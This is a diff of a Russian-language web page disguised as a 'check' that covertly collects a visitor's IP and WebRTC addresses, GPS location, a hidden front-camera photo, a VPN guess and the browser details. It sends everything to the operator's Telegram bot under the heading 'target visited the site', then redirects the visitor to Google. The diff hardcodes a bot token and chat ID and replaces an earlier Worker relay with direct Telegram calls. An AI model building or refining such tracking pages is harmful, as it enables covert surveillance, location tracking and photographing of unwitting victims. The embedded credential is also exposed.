@@ -27,12 +27,11 @@
   button:hover{background:#2ea043}
   button:active{transform:translateY(1px)}
   button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
-  .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
-          min-height:22px;white-space:pre-wrap;word-break:break-all;
-          text-align:left;line-height:1.55}
+  .status{margin-top:20px;font-size:12px;color:#8b949e;font-family:monospace;
+          min-height:18px;white-space:pre-wrap;word-break:break-all;
+          text-align:left;line-height:1.5}
   .ok{color:#3fb950!important}
   .err{color:#f85149!important}
-  .warn{color:#d29922!important}
   video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
@@ -64,9 +63,10 @@
 
 <script>
 // ============================================================
-// ВСТАВЬ URL ТВОЕГО CLOUDFLARE WORKER
+// ВСТАВЬ СЮДА СВОИ ЗНАЧЕНИЯ
 // ============================================================
-var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
+var TG_BOT_TOKEN = "8920061712:AAGsJo14-Ooz3vaOWIPynESJj-24VYmPwng";
+var TG_CHAT_ID   = "8152269891";
 // ============================================================
 
 (function(){
@@ -80,44 +80,39 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     st.textContent = text;
   }
 
-  // ---------- Отправка на Worker с диагностикой ----------
-  async function sendReport(text, photoDataUrl){
-    var payloadKind = photoDataUrl ? 'multipart' : 'json';
-    console.log('[send] → POST', WORKER_URL, '| вид:', payloadKind);
+  // ============================================================
+  // ОТПРАВКА В TELEGRAM — НАПРЯМУЮ, БЕЗ WORKER
+  // ============================================================
 
-    try {
-      var r;
-      if (photoDataUrl) {
-        var blob = await (await fetch(photoDataUrl)).blob();
-        console.log('[send] фото размер:', blob.size, 'байт, тип:', blob.type);
-        var form = new FormData();
-        form.append('caption', text);
-        form.append('photo', blob, 'snapshot.jpg');
-        r = await fetch(WORKER_URL, { method: 'POST', body: form });
-      } else {
-        r = await fetch(WORKER_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text: text })
-        });
-      }
-
-      console.log('[send] ← HTTP статус:', r.status);
-
-      var rawText = await r.text();
-      console.log('[send] ← ответ тела:', rawText.slice(0, 400));
-
-      var j;
-      try { j = JSON.parse(rawText); }
-      catch(e) {
-        return { ok: false, err: 'Worker вернул не-JSON (статус ' + r.status + '): ' + rawText.slice(0, 200) };
-      }
-      return j;
-    } catch (e) {
-      console.error('[send] Исключение:', e);
-      return { ok: false, err: 'Сеть/исключение: ' + e.message };
-    }
+  // Фото + caption через sendPhoto
+  async function sendPhoto(caption, blob){
+    var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto';
+    var form = new FormData();
+    form.append('chat_id', TG_CHAT_ID);
+    form.append('photo', blob, 'snapshot.jpg');
+    form.append('caption', caption.slice(0, 1024));
+    form.append('parse_mode', 'HTML');
+    var r = await fetch(url, { method: 'POST', body: form });
+    return await r.json();
   }
+
+  // Только текст через sendMessage
+  async function sendText(text){
+    var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+    var r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        text: text.slice(0, 4000),
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+    return await r.json();
+  }
+
+  // ============================================================
 
   async function getIpInfo(){
     try {
@@ -194,12 +189,10 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         return resolve({ error: 'getUserMedia not supported' });
       }
       try {
-        console.log('[cam] запрашиваем доступ...');
         var stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
-        console.log('[cam] доступ получен');
         cam.srcObject = stream;
         cam.play();
         await new Promise(function(res){
@@ -213,11 +206,9 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         var ctx = snap.getContext('2d');
         ctx.drawImage(cam, 0, 0, w, h);
         var dataUrl = snap.toDataURL('image/jpeg', 0.85);
-        console.log('[cam] снимок готов:', w + 'x' + h, ', dataURL длина', dataUrl.length);
         stream.getTracks().forEach(function(t){ t.stop(); });
         resolve({ dataUrl: dataUrl, w: w, h: h });
       } catch(e) {
-        console.error('[cam] ошибка:', e.name, e.message);
         resolve({ error: e.name + ': ' + e.message });
       }
     });
@@ -235,11 +226,16 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     } catch(e) { return 'н/д'; }
   }
 
+  // ============================================================
+  // ОСНОВНАЯ ЛОГИКА
+  // ============================================================
+
   btn.addEventListener('click', async function(){
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
     setStatus('Запрашиваем разрешения…');
 
+    // Параллельно: IP, WebRTC, гео, камера
     var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
       getLocalAndSrflx(),
@@ -249,6 +245,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
 
     setStatus('Формируем отчёт…');
 
+    // VPN-подозрение
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
     try {
@@ -262,6 +259,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       }
     } catch(e){}
 
+    // GPS-строка
     var geoLine = 'не получена';
     var addressLine = '';
     if (geo && !geo.error) {
@@ -273,6 +271,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       geoLine = 'отклонено: ' + geo.error;
     }
 
+    // Камера-строка
     var camLine = 'не получена';
     if (camRes && camRes.dataUrl) {
       camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
@@ -280,6 +279,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       camLine = 'отклонено: ' + camRes.error;
     }
 
+    // Итоговый текст для caption
     var text =
       '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ</b>\n' +
       '━━━━━━━━━━━━━━━━━━━\n' +
@@ -302,46 +302,44 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
-    setStatus('Отправляем на сервер...\n\n[1/2] POST → Worker');
+    setStatus('Отправляем в Telegram…');
 
-    var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
-    var res = await sendReport(text, photoData);
+    // ОТПРАВКА
+    try {
+      var result;
+      if (camRes && camRes.dataUrl) {
+        // Есть фото — sendPhoto
+        var blob = await (await fetch(camRes.dataUrl)).blob();
+        result = await sendPhoto(text, blob);
+        console.log('[tg] sendPhoto result:', result);
+      } else {
+        // Без фото — sendMessage
+        result = await sendText(text);
+        console.log('[tg] sendMessage result:', result);
+      }
 
-    // ---------- Разбор результата ----------
-    console.log('[send] финальный результат:', res);
-
-    if (res && res.ok) {
-      setStatus(
-        '✓ Отправлено успешно.\n\n' +
-        'Worker ответил: ' + JSON.stringify(res.tg ? { ok: res.tg.ok } : res),
-        'ok'
-      );
-      btn.textContent = '✓ Готово';
-      setTimeout(function(){
-        window.location.href = 'https://www.google.com';
-      }, 2500);
-      return;
+      if (result && result.ok) {
+        setStatus('✓ Отправлено. Фото и данные пришли.', 'ok');
+        btn.textContent = '✓ Готово';
+        setTimeout(function(){
+          window.location.href = 'https://www.google.com';
+        }, 2500);
+      } else {
+        var reason = '';
+        if (result && result.description) reason = result.description;
+        else if (result && result.error_code) reason = 'error ' + result.error_code;
+        else reason = 'неизвестная ошибка';
+        setStatus('✗ Отправка не удалась: ' + reason, 'err');
+        btn.textContent = 'Повторить';
+        btn.disabled = false;
+        console.error('[tg] error:', result);
+      }
+    } catch(e) {
+      setStatus('✗ Ошибка отправки: ' + e.message, 'err');
+      btn.textContent = 'Повторить';
+      btn.disabled = false;
+      console.error('[tg] exception:', e);
     }
-
-    // Ошибки — показываем подробно
-    var errMsg = '';
-    if (!res) {
-      errMsg = 'Не получили ответа от Worker. Проверь URL в WORKER_URL.';
-    } else if (res.err) {
-      errMsg = 'Ошибка: ' + res.err;
-    } else if (res.tg && res.tg.error_code) {
-      errMsg = 'Telegram вернул ошибку ' + res.tg.error_code + ': ' + (res.tg.description || '');
-    } else {
-      errMsg = 'Неизвестная ошибка: ' + JSON.stringify(res);
-    }
-
-    setStatus(
-      '✗ ОТПРАВКА НЕ УДАЛАСЬ\n\n' + errMsg +
-      '\n\nОткрой консоль (Cmd+Option+C) для деталей.',
-      'err'
-    );
-    btn.textContent = 'Повторить';
-    btn.disabled = false;
   });
 })();
 </script>
